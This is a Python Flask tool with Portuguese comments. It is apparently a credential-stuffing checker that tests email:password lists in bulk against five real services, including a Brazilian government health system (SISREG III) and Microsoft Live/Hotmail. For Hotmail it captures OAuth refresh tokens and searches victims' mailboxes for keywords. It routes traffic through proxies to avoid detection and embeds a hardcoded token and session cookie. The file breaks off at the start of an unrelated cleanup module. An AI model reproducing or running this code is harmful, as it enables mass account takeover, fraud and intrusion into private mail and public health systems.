#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import time
import platform
import shutil
import socket
import subprocess
import tempfile
from pathlib import Path
import requests
import hashlib
import threading
import urllib3
import json
import queue
from flask import Flask, render_template_string, request, jsonify, Response, stream_with_context
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import unquote
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# =========================================
# CONFIGURACOES DE PROXY E MONITORAMENTO
# =========================================
proxy_cache = {
    "proxy_url": "",
    "used_bytes": 0,
    "last_proxy": ""
}

USAGE_FILE = "proxy_usage.json"
MAX_USAGE_BYTES = 1 * 1024 * 1024 * 1024  # 1GB

def load_usage_cache():
    global proxy_cache
    if os.path.exists(USAGE_FILE):
        try:
            with open(USAGE_FILE, 'r') as f:
                data = json.load(f)
                proxy_cache["last_proxy"] = data.get("last_proxy", "")
                proxy_cache["used_bytes"] = data.get("used_bytes", 0)
                return True
        except:
            pass
    return False

def save_usage_cache():
    global proxy_cache
    try:
        with open(USAGE_FILE, 'w') as f:
            json.dump({
                "last_proxy": proxy_cache["last_proxy"],
                "used_bytes": proxy_cache["used_bytes"]
            }, f)
    except:
        pass

load_usage_cache()

PROXY_URL = ""
PROXIES = {}
CURRENT_USAGE = 0
usage_lock = threading.Lock()

def update_proxy(url):
    global PROXY_URL, PROXIES, CURRENT_USAGE, proxy_cache
    if not url:
        PROXY_URL = ""
        PROXIES = {}
        return
    if url == proxy_cache["last_proxy"]:
        CURRENT_USAGE = proxy_cache["used_bytes"]
    else:
        CURRENT_USAGE = 0
        proxy_cache["used_bytes"] = 0
    PROXY_URL = url
    PROXIES = {"http": url, "https": url}
    proxy_cache["proxy_url"] = url
    proxy_cache["last_proxy"] = url
    save_usage_cache()

def clear_proxy():
    global PROXY_URL, PROXIES, CURRENT_USAGE
    PROXY_URL = ""
    PROXIES = {}
    CURRENT_USAGE = 0

def update_usage(response):
    global CURRENT_USAGE, proxy_cache
    size = len(response.content) + 500
    with usage_lock:
        CURRENT_USAGE += size
        proxy_cache["used_bytes"] = CURRENT_USAGE
        save_usage_cache()

# =========================================
# FILA PARA STREAMING
# =========================================
fila_resultados = queue.Queue()
execucao_ativa = False
execucao_cancelada = False
execucao_id = 0

# =========================================
# API 1 - MEU NUMERO VIRTUAL (MNV)
# =========================================
HEADERS_MNV = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json"
}

def testar_mnv(email, senha):
    try:
        payload = {"email": email, "password": senha, "token": ""}
        login_headers = {"Content-Type": "application/json", "secret": "PUB_CAP", "User-Agent": HEADERS_MNV["User-Agent"]}
        response = requests.post("https://app.meunumerovirtual.com/api/v2/user/auth", json=payload, headers=login_headers, timeout=20)
        try:
            data = response.json()
        except:
            return {"status": "DIES", "motivo": "Resposta invalida", "saldo": "N/A"}
        if "error" in data and data["error"] != 0:
            msg = data.get("message", "Erro")
            if "Invalid credentials" in msg or "email" in msg.lower():
                return {"status": "DIES", "motivo": "Email ou senha incorretos", "saldo": "N/A"}
            return {"status": "DIES", "motivo": msg[:50], "saldo": "N/A"}
        jwt = data.get("jwt") or data.get("token") or data.get("access_token")
        if not jwt:
            return {"status": "DIES", "motivo": "Token nao encontrado", "saldo": "N/A"}
        headers_saldo = {"Authorization": f"Bearer {jwt}", "User-Agent": HEADERS_MNV["User-Agent"], "Accept": "application/json"}
        response_saldo = requests.get("https://app.meunumerovirtual.com/api/v2/user/balance", headers=headers_saldo, timeout=20)
        if response_saldo.status_code == 200:
            try:
                saldo_data = response_saldo.json()
                if saldo_data.get("error", 1) == 0:
                    saldo = saldo_data.get("data", {}).get("balance", 0.0)
                    return {"status": "LIVES", "motivo": f"Saldo: R$ {saldo}", "saldo": saldo}
                return {"status": "DIES", "motivo": "Erro ao buscar saldo", "saldo": "N/A"}
            except:
                return {"status": "DIES", "motivo": "Resposta invalida", "saldo": "N/A"}
        return {"status": "DIES", "motivo": "Erro ao pegar saldo", "saldo": "N/A"}
    except Exception as e:
        return {"status": "DIES", "motivo": str(e)[:50], "saldo": "N/A"}

# =========================================
# API 2 - SISREG III
# =========================================
def gerar_hash_site(senha_pura):
    senha_limpa = senha_pura.strip()
    return hashlib.sha256(senha_limpa.upper().encode('utf-8')).hexdigest()

def limpar_texto(texto):
    if not texto:
        return texto
    texto = texto.replace('&nbsp;', '').strip()
    texto = re.sub(r'\s+', ' ', texto)
    return texto.strip()

def extrair_dados_sisreg(html):
    dados = {"operador": "N/A", "perfil": "N/A", "unidade": "N/A"}
    padroes = {
        "operador": r"Operador:\s*</b>\s*<font[^>]*>(?:&nbsp;|\s)*([^<]+?)(?:&nbsp;|\s)*</font>",
        "perfil": r"Perfil:\s*</b>\s*<font[^>]*>(?:&nbsp;|\s)*([^<]+?)(?:&nbsp;|\s)*</font>",
        "unidade": r"Unidade:\s*</b>\s*<font[^>]*>(?:&nbsp;|\s)*([^<]+?)(?:&nbsp;|\s)*</font>",
    }
    for campo, padrao in padroes.items():
        match = re.search(padrao, html, re.IGNORECASE)
        if match:
            dados[campo] = limpar_texto(match.group(1))
    for campo, rotulo in (("operador", "Operador"), ("perfil", "Perfil"), ("unidade", "Unidade")):
        if dados[campo] == "N/A":
            match = re.search(
                rf"{rotulo}:\s*</b>\s*(?:<font[^>]*>)?\s*([^<]+?)\s*(?:</font>)?",
                html,
                re.IGNORECASE,
            )
            if match:
                dados[campo] = limpar_texto(match.group(1))
    if dados["unidade"] != "N/A":
        dados["unidade"] = re.sub(r'\s*V\s*-\s*[\d.]+.*$', '', dados["unidade"]).strip()
    return dados

def testar_sisreg(usuario, senha):
    try:
        senha_hash = gerar_hash_site(senha)
        cookies = {'TS01cd1fda': '0140e3e4e598fa5b567163260fea13011a810718d0ae91bc8bd58017d51d5fac9546a345770c595f7792576b69bde566e549edcf993dd4c07d406e0d4ab3b92b3856012151638cc579cae2789c2b969e63425fea3f'}
        headers = {
            'Host': 'sisregiii.saude.gov.br',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://sisregiii.saude.gov.br',
            'Referer': 'https://sisregiii.saude.gov.br/'
        }
        payload = {'usuario': usuario, 'senha': '', 'senha_256': senha_hash, 'etapa': 'ACESSO', 'logout': ''}
        response = requests.post("https://sisregiii.saude.gov.br/", data=payload, headers=headers, cookies=cookies, timeout=20, allow_redirects=True)
        html = response.text
        if "AVISO AOS OPERADORES DO SISREG" in html:
            return {"status": "DIES", "motivo": "Senha incorreta", "dados": {}}
        if "detalheUsuario" in html or "Sair" in html:
            dados = extrair_dados_sisreg(html)
            if dados["operador"] != "N/A" and dados["perfil"] != "N/A":
                return {"status": "LIVES", "motivo": f"Login OK | Operador: {dados['operador']}", "dados": dados}
            return {"status": "DIES", "motivo": "Dados incompletos", "dados": dados}
        if "Login ou senha incorreto(s)" in html:
            return {"status": "DIES", "motivo": "Senha incorreta", "dados": {}}
        return {"status": "DIES", "motivo": "Falha no login", "dados": {}}
    except Exception as e:
        return {"status": "DIES", "motivo": str(e)[:50], "dados": {}}

# =========================================
# API 3 - SMS24H
# =========================================
HEADERS_SMS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json, text/plain, */*",
    "locale": "en",
    "x-access-token": "Kkqpiskl21wpo2iop2daiopsJKS5123jdskj2o128oxiziouWOidos",
    "Origin": "https://sms24h.org",
    "Referer": "https://sms24h.org/login",
    "Content-Type": "application/json"
}

def testar_sms24h(email, senha):
    try:
        payload = {"nome": "", "email": email, "password": senha, "cpf": "", "recaptchaToken": None}
        response = requests.post("https://oauth.sms24h.org/auth/login", json=payload, headers=HEADERS_SMS, timeout=25)
        api_msg = None
        try:
            data = response.json()
            api_msg = data.get("msg_message") or data.get("message")
        except:
            data = {}
        if api_msg:
            if "error" in api_msg.lower() or "incorrect" in api_msg.lower() or "invalid" in api_msg.lower() or "flood" in api_msg.lower():
                return {"status": "DIES", "motivo": api_msg, "saldo": "N/A"}
            token = api_msg
            headers_saldo = {"Authorization": f"Bearer {token}", "User-Agent": "Mozilla/5.0"}
            response_saldo = requests.get("https://api.sms24h.org/stubs/handler_api/getCredito", headers=headers_saldo, timeout=25)
            if response_saldo.status_code == 200:
                try:
                    saldo_data = response_saldo.json()
                    if "credito" in saldo_data:
                        saldo = saldo_data["credito"]
                        return {"status": "LIVES", "motivo": f"Saldo: {saldo}", "saldo": saldo}
                except:
                    pass
            return {"status": "DIES", "motivo": api_msg if response_saldo.status_code != 200 else "Erro ao buscar saldo", "saldo": "N/A"}
        if response.status_code != 200:
            return {"status": "DIES", "motivo": f"Erro HTTP {response.status_code}", "saldo": "N/A"}
        return {"status": "DIES", "motivo": "Resposta inesperada da API", "saldo": "N/A"}
    except Exception as e:
        return {"status": "DIES", "motivo": str(e)[:50], "saldo": "N/A"}

# =========================================
# API 4 - EMAILNATOR
# =========================================
def extrair_dados_dashboard(html):
    saldo = "N/A"
    plano = "N/A"
    try:
        soup = BeautifulSoup(html, 'html.parser')
        for elem in soup.find_all(['p', 'div', 'span', 'h3']):
            if elem.get_text(strip=True) == "Account Balance":
                next_elem = elem.find_next_sibling()
                if next_elem:
                    saldo_elem = next_elem.find('p', class_=re.compile(r'text-4xl'))
                    if saldo_elem:
                        saldo = saldo_elem.get_text(strip=True)
                        break
                    texto = next_elem.get_text(strip=True)
                    if '$' in texto:
                        saldo = texto
                        break
        if saldo == "N/A":
            padrao = r'<p class="text-4xl font-bold tracking-tight mb-1">([^<]+)</p>'
            match = re.search(padrao, html)
            if match:
                saldo = match.group(1).strip()
        for elem in soup.find_all(['p', 'div', 'span']):
            texto = elem.get_text(strip=True)
            if texto in ["No Plan", "Premium", "Pro", "Basic", "Enterprise"]:
                parent = elem.find_parent()
                if parent:
                    parent_text = parent.get_text()
                    if 'Subscription' in parent_text or 'subscription' in parent_text.lower():
                        plano = texto
                        break
        if plano == "N/A":
            padrao = r'<p class="text-3xl font-bold text-muted-foreground tracking-tight">([^<]+)</p>'
            matches = re.findall(padrao, html)
            for match in matches:
                if match.strip() in ["No Plan", "Premium", "Pro", "Basic", "Enterprise"]:
                    plano = match.strip()
                    break
        if plano == "N/A" and "No Plan" in html:
            plano = "No Plan"
        return {"saldo": saldo, "plano": plano}
    except Exception as e:
        return {"saldo": "N/A", "plano": "N/A", "erro": str(e)}

def testar_emailnator(email, senha):
    try:
        session = requests.Session()
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://premium.emailnator.com",
            "Referer": "https://premium.emailnator.com/login"
        }
        csrf_response = session.get("https://premium.emailnator.com/api/auth/csrf", headers=headers, timeout=15)
        if csrf_response.status_code != 200:
            return {"status": "DIES", "motivo": f"CSRF falhou: {csrf_response.status_code}", "saldo": "N/A", "plano": "N/A"}
        csrf_data = csrf_response.json()
        csrf_token = csrf_data.get("csrfToken")
        if not csrf_token:
            return {"status": "DIES", "motivo": "CSRF token nao encontrado", "saldo": "N/A", "plano": "N/A"}
        login_data = {
            "email": email,
            "password": senha,
            "csrfToken": csrf_token,
            "callbackUrl": "https://premium.emailnator.com/dashboard",
            "json": "true"
        }
        login_headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://premium.emailnator.com",
            "Referer": "https://premium.emailnator.com/login",
            "x-auth-return-redirect": "1",
            "User-Agent": headers["User-Agent"]
        }
        response = session.post(
            "https://premium.emailnator.com/api/auth/callback/credentials",
            data=login_data,
            headers=login_headers,
            timeout=30
        )
        if response.status_code == 200:
            try:
                data = response.json()
                if "url" in data:
                    redirect_url = data["url"]
                    if "dashboard" in redirect_url:
                        session_response = session.get("https://premium.emailnator.com/api/auth/session", headers=headers, timeout=15)
                        if session_response.status_code == 200:
                            session_data = session_response.json()
                            if session_data and "user" in session_data:
                                user = session_data["user"]
                                dashboard_response = session.get("https://premium.emailnator.com/dashboard", headers=headers, timeout=15)
                                if dashboard_response.status_code == 200:
                                    html = dashboard_response.text
                                    dados = extrair_dados_dashboard(html)
                                    return {
                                        "status": "LIVES",
                                        "motivo": f"Login OK | Saldo: {dados.get('saldo', 'N/A')} | Plano: {dados.get('plano', 'N/A')}",
                                        "saldo": dados.get("saldo", "N/A"),
                                        "plano": dados.get("plano", "N/A"),
                                        "usuario": user.get("name", email)
                                    }
                                else:
                                    return {"status": "LIVES", "motivo": f"Dashboard inacessivel ({dashboard_response.status_code})", "saldo": "N/A", "plano": "N/A"}
                            else:
                                return {"status": "LIVES", "motivo": "Login OK, mas sessao vazia", "saldo": "N/A", "plano": "N/A"}
                        else:
                            return {"status": "LIVES", "motivo": "Login OK, mas sessao inacessivel", "saldo": "N/A", "plano": "N/A"}
                    elif "login" in redirect_url:
                        return {"status": "DIES", "motivo": "Credenciais invalidas", "saldo": "N/A", "plano": "N/A"}
                if "error" in data:
                    error_msg = data["error"]
                    if "password" in error_msg.lower() or "credential" in error_msg.lower():
                        return {"status": "DIES", "motivo": "Senha incorreta", "saldo": "N/A", "plano": "N/A"}
                    elif "email" in error_msg.lower() or "user" in error_msg.lower():
                        return {"status": "DIES", "motivo": "Email nao encontrado", "saldo": "N/A", "plano": "N/A"}
                    else:
                        return {"status": "DIES", "motivo": f"Erro: {error_msg}", "saldo": "N/A", "plano": "N/A"}
            except ValueError:
                if "error" in response.text.lower():
                    if "password" in response.text.lower():
                        return {"status": "DIES", "motivo": "Senha incorreta", "saldo": "N/A", "plano": "N/A"}
                    elif "email" in response.text.lower():
                        return {"status": "DIES", "motivo": "Email nao encontrado", "saldo": "N/A", "plano": "N/A"}
        return {"status": "DIES", "motivo": f"Resposta inesperada (Status: {response.status_code})", "saldo": "N/A", "plano": "N/A"}
    except requests.exceptions.Timeout:
        return {"status": "DIES", "motivo": "Servidor nao respondeu", "saldo": "N/A", "plano": "N/A"}
    except requests.exceptions.ConnectionError:
        return {"status": "DIES", "motivo": "Erro de conexao", "saldo": "N/A", "plano": "N/A"}
    except Exception as e:
        return {"status": "DIES", "motivo": str(e)[:100], "saldo": "N/A", "plano": "N/A"}

# =========================================
# API 5 - HOTMAIL CHECKER
# =========================================
def g_s(t, i, f):
    try:
        return t.split(i)[1].split(f)[0]
    except:
        return ""

def e_p(h):
    p = g_s(h, 'name="PPFT" id="i0327" value="', '"')
    if not p:
        p = g_s(h, 'name=\\"PPFT\\" id=\\"i0327\\" value=\\"', '\\"')
    if not p:
        m = re.search(r'sFT\s*:\s*["\'](.*?)["\']', h)
        if m:
            p = m.group(1)
    return p

def e_u(h):
    u = g_s(h, 'urlPost:"', '"')
    if not u:
        m = re.search(r'["\']urlPost(?:Msa)?["\']\s*:\s*["\']([^"\']+)', h)
        if m:
            u = m.group(1)
    return u

def g_h():
    return {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}

def l_h(s, u, p, use_proxy=False):
    global PROXIES
    try:
        prox = PROXIES if use_proxy and PROXIES else None
        r = s.get("https://login.live.com/login.srf", headers=g_h(), timeout=15, proxies=prox)
        if use_proxy and prox:
            update_usage(r)
        f = e_p(r.text)
        up = e_u(r.text) or "https://login.live.com/ppsecure/post.srf"
        o = f"{up}?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch"
        y = f"ps=2&PPFT={f}&login={u}&loginfmt={u}&type=11&LoginOptions=1&passwd={p}"
        r1 = s.post(o, data=y, headers={"Content-Type": "application/x-www-form-urlencoded", **g_h()}, timeout=15, allow_redirects=False, proxies=prox)
        if use_proxy and prox:
            update_usage(r1)
        src = r1.text
        if "privacynotice" in src:
            p_u = g_s(src, 'action="', '"').replace("&amp;", "&")
            p_c = g_s(src, 'name="code" id="code" value="', '"')
            p_i = g_s(src, 'name="correlation_id" id="correlation_id" value="', '"')
            if p_u and p_c:
                rp = s.post(p_u, data={"correlation_id": p_i, "code": p_c}, headers=g_h(), timeout=15, proxies=prox)
                if use_proxy and prox:
                    update_usage(rp)
        if "incorrect" in src:
            return {"error": "S_I", "status": "die"}
        f2 = e_p(src)
        u2 = e_u(src)
        if f2 and u2:
            r2 = s.post(u2, data={"login": u, "passwd": p, "PPFT": f2, "ps": "2"}, headers={"Content-Type": "application/x-www-form-urlencoded", **g_h()}, timeout=15, allow_redirects=False, proxies=prox)
            if use_proxy and prox:
                update_usage(r2)
        a = {"client_id": "0000000048170EF2", "redirect_uri": "https://login.live.com/oauth20_desktop.srf", "response_type": "token", "scope": "service::outlook.office.com::MBI_SSL"}
        ra = s.get("https://login.live.com/oauth20_authorize.srf", params=a, headers=g_h(), timeout=15, allow_redirects=False, proxies=prox)
        if use_proxy and prox:
            update_usage(ra)
        l = ra.headers.get("Location", "")
        t = re.search(r'refresh_token=([^&\s#]+)', unquote(l))
        if t:
            return {"refresh_token": t.group(1), "status": "live"}
        if "ANON" in s.cookies:
            return {"status": "live", "info": "L|S_T"}
        return {"error": "F_L", "status": "die"}
    except Exception as e:
        return {"error": "E_C", "status": "die"}

def g_a(s, r, use_proxy=False):
    global PROXIES
    try:
        prox = PROXIES if use_proxy and PROXIES else None
        y = f"grant_type=refresh_token&client_id=0000000048170EF2&scope=https%3A%2F%2Fsubstrate.office.com%2FUser-Internal.ReadWrite&refresh_token={r}"
        res = s.post("https://login.live.com/oauth20_token.srf", data=y, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15, proxies=prox)
        if use_proxy and prox:
            update_usage(res)
        return res.json().get("access_token", "")
    except:
        return ""

def g_p(s, a, c, use_proxy=False):
    global PROXIES
    try:
        prox = PROXIES if use_proxy and PROXIES else None
        h = {"Authorization": f"Bearer {a}", "X-AnchorMailbox": f"CID:{c}", "Accept": "application/json"}
        res = s.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=h, timeout=10, proxies=prox)
        if use_proxy and prox:
            update_usage(res)
        r = res.json()
        l = r.get("accounts", [{}])[0].get("location", "")
        if not l:
            l = r.get("preferences", {}).get("location", "")
        return l if l else "UN"
    except:
        return "UN"

def s_k(s, a, c, k, use_proxy=False):
    global PROXIES
    try:
        prox = PROXIES if use_proxy and PROXIES else None
        h = {"Authorization": f"Bearer {a}", "X-AnchorMailbox": f"CID:{c}", "Content-Type": "application/json"}
        b = {"Cvid": "49c85090-df47-7cfc-7dff-b6f493b9eaec", "Scenario": {"Name": "owa.react"}, "TimeZone": "Pacific Standard Time", "TextDecorations": "Off", "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}, {"Term": {"DistinguishedFolderName": "DeletedItems"}}]}, "Query": {"QueryString": k}, "Size": 25, "Sort": [{"Field": "Time", "SortDirection": "Desc"}], "EnableTopResults": True}]}
        res = s.post("https://outlook.live.com/searchservice/api/v2/query?n=88&cv=z%2B4rC2Rg7h%2BxLG28lplshj.124", headers=h, json=b, timeout=15, proxies=prox)
        if use_proxy and prox:
            update_usage(res)
        d = res.json()
        e = d.get("EntitySets", [{}])[0].get("ResultSets", [{}])[0]
        t = e.get("Total", 0)
        m = e.get("Results", [])
        ld = ""
        if m:
            ld = m[0].get("LastDeliveryOrRenewTime", "").split("T")[0]
        elif "HitHighlightedSummary" in res.text:
            t = t if t > 0 else 1
        return {"has_result": t > 0, "total": t, "last_date": ld}
    except:
        return {"has_result": False, "total": 0, "last_date": ""}

def testar_hotmail(email, senha, keyword="", mode="fastest", use_proxy=False):
    """Funcao wrapper para o checker do Hotmail com suporte a keyword e fastest"""
    try:
        if ':' not in f"{email}:{senha}":
            return {"status": "DIES", "motivo": "Formato invalido", "saldo": "N/A", "dados": {}}
        s = requests.Session()
        r = l_h(s, email, senha, use_proxy)
        if r['status'] == 'live':
            ct = "UN"
            t = r.get('refresh_token')
            cid = s.cookies.get('MSPCID', '').upper()
            result_msg = "Login OK"
            if t and cid:
                at = g_a(s, t, use_proxy)
                if at:
                    ct = g_p(s, at, cid, use_proxy)
                    if mode == "search" and keyword:
                        kw = s_k(s, at, cid, keyword, use_proxy)
                        result_msg = f"Login OK | MSG '{keyword}': {'V' if kw['has_result'] else 'X'} | TOTAL: {kw['total']}"
                        if kw['last_date']:
                            result_msg += f" | DATE: {kw['last_date']}"
                else:
                    result_msg = "Login OK | TOKEN_ERR"
            else:
                result_msg = "Login OK | TOKEN_RESTRICT"
            return {"status": "LIVES", "motivo": result_msg, "saldo": "N/A", "dados": {"country": ct}}
        else:
            return {"status": "DIES", "motivo": r.get('error', 'Falha no login'), "saldo": "N/A", "dados": {}}
    except Exception as e:
        return {"status": "DIES", "motivo": str(e)[:50], "saldo": "N/A", "dados": {}}

# =========================================
# FUNCAO MULTI-CHECKER (5 APIS)
# =========================================
def testar_multiplas_apis(email, senha, apis_selecionadas, hotmail_keyword="", hotmail_mode="fastest", hotmail_proxy=False):
    resultados = {}
    with ThreadPoolExecutor(max_workers=len(apis_selecionadas)) as executor:
        future_to_api = {}
        if 'mnv' in apis_selecionadas:
            future_to_api[executor.submit(testar_mnv, email, senha)] = 'mnv'
        if 'sms24h' in apis_selecionadas:
            future_to_api[executor.submit(testar_sms24h, email, senha)] = 'sms24h'
        if 'sisreg' in apis_selecionadas:
            future_to_api[executor.submit(testar_sisreg, email, senha)] = 'sisreg'
        if 'emailnator' in apis_selecionadas:
            future_to_api[executor.submit(testar_emailnator, email, senha)] = 'emailnator'
        if 'hotmail' in apis_selecionadas:
            future_to_api[executor.submit(testar_hotmail, email, senha, hotmail_keyword, hotmail_mode, hotmail_proxy)] = 'hotmail'
        for future in future_to_api:
            api_name = future_to_api[future]
            try:
                resultado = future.result()
                resultado['api'] = api_name
                resultados[api_name] = resultado
            except Exception as e:
                resultados[api_name] = {"status": "DIES", "motivo": f"Erro no teste: {str(e)[:50]}", "saldo": "N/A", "api": api_name}
    return resultados

def processar_conta(linha, api_escolhida, hotmail_keyword="", hotmail_mode="fastest", hotmail_proxy=False):
    global execucao_cancelada
    if execucao_cancelada:
        return None
    linha = linha.strip()
    if not linha or ":" not in linha:
        return None
    email, senha = linha.split(":", 1)
    email = email.strip()
    senha = senha.strip()
    if ',' in api_escolhida:
        apis = [api.strip() for api in api_escolhida.split(',')]
        resultados = testar_multiplas_apis(email, senha, apis, hotmail_keyword, hotmail_mode, hotmail_proxy)
        resultado_consolidado = {
            "numero": f"{email}:{senha}",
            "status": "LIVES" if any(r['status'] == 'LIVES' for r in resultados.values()) else "DIES",
            "motivo": "Resultados por API",
            "saldo": "N/A",
            "dados": {},
            "resultados_por_api": resultados
        }
        return resultado_consolidado
    else:
        if api_escolhida == "mnv":
            resultado = testar_mnv(email, senha)
            return {"numero": f"{email}:{senha}", "status": resultado["status"], "motivo": resultado["motivo"], "saldo": resultado.get("saldo", "N/A"), "dados": {}, "resultados_por_api": None}
        elif api_escolhida == "sms24h":
            resultado = testar_sms24h(email, senha)
            return {"numero": f"{email}:{senha}", "status": resultado["status"], "motivo": resultado["motivo"], "saldo": resultado.get("saldo", "N/A"), "dados": {}, "resultados_por_api": None}
        elif api_escolhida == "sisreg":
            resultado = testar_sisreg(email, senha)
            return {"numero": f"{email}:{senha}", "status": resultado["status"], "motivo": resultado["motivo"], "saldo": "N/A", "dados": resultado.get("dados", {}), "resultados_por_api": None}
        elif api_escolhida == "emailnator":
            resultado = testar_emailnator(email, senha)
            return {"numero": f"{email}:{senha}", "status": resultado["status"], "motivo": resultado["motivo"], "saldo": resultado.get("saldo", "N/A"), "dados": {"plano": resultado.get("plano", "N/A")}, "resultados_por_api": None}
        elif api_escolhida == "hotmail":
            resultado = testar_hotmail(email, senha, hotmail_keyword, hotmail_mode, hotmail_proxy)
            return {"numero": f"{email}:{senha}", "status": resultado["status"], "motivo": resultado["motivo"], "saldo": resultado.get("saldo", "N/A"), "dados": resultado.get("dados", {}), "resultados_por_api": None}
        return None

def processar_com_streaming(texto, api_escolhida, quantidade_threads=2, hotmail_keyword="", hotmail_mode="fastest", hotmail_proxy=False, run_id=None):
    global execucao_cancelada, fila_resultados, execucao_id
    quantidade_threads = int(quantidade_threads)
    linhas = texto.split('\n')
    linhas_validas = [l for l in linhas if l.strip() and ":" in l]
    total = len(linhas_validas)
    processados = 0
    lives = 0
    dies = 0
    if run_id != execucao_id or execucao_cancelada:
        return
    fila_resultados.put({"type": "total", "total": total})
    with ThreadPoolExecutor(max_workers=quantidade_threads) as executor:
        futures = []
        for linha in linhas_validas:
            if execucao_cancelada or run_id != execucao_id:
                break
            futures.append(executor.submit(processar_conta, linha, api_escolhida, hotmail_keyword, hotmail_mode, hotmail_proxy))
        for future in futures:
            if execucao_cancelada or run_id != execucao_id:
                break
            item = future.result()
            if item is None:
                continue
            processados += 1
            if item["status"] == "LIVES":
                lives += 1
            else:
                dies += 1
            if run_id != execucao_id:
                break
            fila_resultados.put({
                "type": "resultado",
                "item": item,
                "processados": processados,
                "total": total,
                "lives": lives,
                "dies": dies
            })
    if run_id == execucao_id:
        fila_resultados.put({"type": "finalizado", "lives": lives, "dies": dies, "total": total})
        execucao_cancelada = False

# =========================================
# ROTAS FLASK
# =========================================
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/start', methods=['POST'])
def start_processing():
    global execucao_ativa, execucao_cancelada, fila_resultados, execucao_id
    data = request.get_json()
    raw_text = data.get('numbers', '')
    api = data.get('api', 'mnv')
    hotmail_keyword = data.get('hotmail_keyword', '')
    hotmail_mode = data.get('hotmail_mode', 'fastest')
    hotmail_proxy = data.get('hotmail_proxy', False)
    try:
        quantidade_threads = int(data.get('threads', 2))
    except (TypeError, ValueError):
        quantidade_threads = 2
    quantidade_threads = int(quantidade_threads)
    if not raw_text:
        return jsonify({"error": "Nenhum dado fornecido"}), 400
    while not fila_resultados.empty():
        try:
            fila_resultados.get_nowait()
        except:
            break
    execucao_cancelada = False
    execucao_ativa = True
    execucao_id += 1
    run_id = execucao_id
    import threading
    thread = threading.Thread(
        target=processar_com_streaming,
        args=(raw_text, api, quantidade_threads, hotmail_keyword, hotmail_mode, hotmail_proxy, run_id),
    )
    thread.daemon = True
    thread.start()
    return jsonify({"status": "started"})

@app.route('/stop', methods=['POST'])
def stop_processing():
    global execucao_cancelada, execucao_ativa, execucao_id
    execucao_cancelada = True
    execucao_ativa = False
    execucao_id += 1
    while not fila_resultados.empty():
        try:
            fila_resultados.get_nowait()
        except queue.Empty:
            break
    return jsonify({"status": "stopped"})

@app.route('/stream')
def stream():
    def generate():
        global execucao_ativa
        while True:
            try:
                item = fila_resultados.get(timeout=1)
                if item is None:
                    continue
                yield f"data: {json.dumps(item)}\n\n"
                if item.get("type") == "finalizado":
                    execucao_ativa = False
                    break
            except queue.Empty:
                if not execucao_ativa and fila_resultados.empty():
                    break
                continue
            except Exception as e:
                print(f"Erro no stream: {e}")
                break
    return Response(
        stream_with_context(generate()),
        mimetype="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"}
    )

@app.route('/api/set_proxy', methods=['POST'])
def set_proxy():
    global PROXY_URL, PROXIES, CURRENT_USAGE, proxy_cache
    try:
        data = request.json
        url = data.get('proxy_url', '').strip()
        if not url:
            return jsonify({"success": False, "error": "URL vazia"})
        if not url.startswith(('http://', 'https://')):
            return jsonify({"success": False, "error": "URL deve comecar com http:// ou https://"})
        is_cached = (url == proxy_cache.get("last_proxy", ""))
        if is_cached:
            CURRENT_USAGE = proxy_cache.get("used_bytes", 0)
        else:
            CURRENT_USAGE = 0
            proxy_cache["used_bytes"] = 0
        PROXY_URL = url
        PROXIES = {"http": url, "https": url}
        proxy_cache["proxy_url"] = url
        proxy_cache["last_proxy"] = url
        proxy_cache["used_bytes"] = CURRENT_USAGE
        try:
            with open(USAGE_FILE, 'w') as f:
                json.dump({
                    "last_proxy": proxy_cache["last_proxy"],
                    "used_bytes": proxy_cache["used_bytes"]
                }, f)
        except:
            pass
        return jsonify({
            "success": True,
            "message": "Proxy configurado",
            "is_cached": is_cached,
            "used_bytes": CURRENT_USAGE
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/clear_proxy', methods=['POST'])
def clear_proxy():
    global PROXY_URL, PROXIES, CURRENT_USAGE
    try:
        PROXY_URL = ""
        PROXIES = {}
        CURRENT_USAGE = 0
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/proxy_usage')
def get_usage():
    global CURRENT_USAGE
    return jsonify({"used": CURRENT_USAGE, "max": MAX_USAGE_BYTES})

@app.route('/api/get_proxy_state')
def get_proxy_state():
    global proxy_cache
    return jsonify({
        "last_proxy": proxy_cache.get("last_proxy", ""),
        "cached_bytes": proxy_cache.get("used_bytes", 0)
    })

# =========================================
# MÓDULO ADICIONAL: LIMPEZA 6
# Mantem as rotas e funcoes originais da 5EM1 acima intactas.
# =========================================
L6_CATEGORIES = {
    "user_temp": ("Temporarios do usuario", "Arquivos temporarios criados por aplicativos."),
    "windows_temp": ("Temporarios do Windows", "Residuos temporarios do sistema."),
    "windows_update": ("Cache do Windows Update", "Pacotes temporarios ja baixados."),
